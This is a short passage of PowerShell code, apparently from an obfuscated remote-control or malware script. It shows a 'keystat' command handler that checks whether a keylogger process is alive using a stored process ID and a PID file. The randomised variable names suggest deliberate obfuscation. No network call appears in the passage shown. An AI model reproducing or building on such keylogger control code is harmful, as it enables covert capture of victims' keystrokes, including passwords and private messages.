            "keystat" {
                $ODAUqj = $null
                if ($script:keylogPid) { $ODAUqj = Get-Process -Id $script:keylogPid -EA SilentlyContinue }
                if (-not $ODAUqj -and (Test-Path -LiteralPath $script:keylogPidFile)) {
                    try { $oWO9Tf = [int](Get-Content -LiteralPath $script:keylogPidFile -Raw); $ODAUqj = Get-Process -Id $oWO9Tf -EA SilentlyContinue } catch { }
                }
                if ($ODAUqj) {
